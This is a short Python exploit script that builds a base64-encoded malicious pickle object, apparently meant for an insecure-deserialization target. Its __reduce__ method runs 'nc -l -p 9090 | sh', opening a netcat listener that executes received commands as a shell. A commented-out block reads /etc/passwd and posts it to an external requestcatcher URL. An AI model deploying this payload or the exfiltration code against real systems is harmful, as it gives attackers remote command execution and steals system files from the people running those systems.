import pickle
import base64
class GNAT:
    def __reduce__(self):
        import os
        return (os.system, ('nc -l -p 9090 | sh',) )
        #  is it possible to return the bash shell 

serialized = pickle.dumps(GNAT())
serialized = base64.b64encode(serialized)
print(serialized)


# with open('/etc/passwd', 'r') as f:
#     r = requests.post('https://tyson.requestcatcher.com/', files={'passed.txt': f})